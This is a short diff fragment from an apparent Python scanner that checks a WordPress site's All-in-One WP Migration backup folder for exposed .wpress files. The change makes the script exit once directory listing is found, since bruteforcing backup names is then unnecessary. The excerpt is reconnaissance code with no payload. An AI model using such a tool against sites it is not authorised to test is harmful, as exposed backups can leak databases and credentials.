@@ -40,6 +40,7 @@ lazycheck = session.get(""+url+"/wp-content/ai1wm-backups/", headers=headers,ver
 if ".wpress" in lazycheck.content:
 	print ("[*] Do not need to bruteforce as the backup folder has directory listings enabled.[*] ")
 	print ("[*] Please Browse to "+url+"/wp-content/ai1wm-backups/ to see exposed directory [*] ")
+	sys.exit(0)
 
 
 
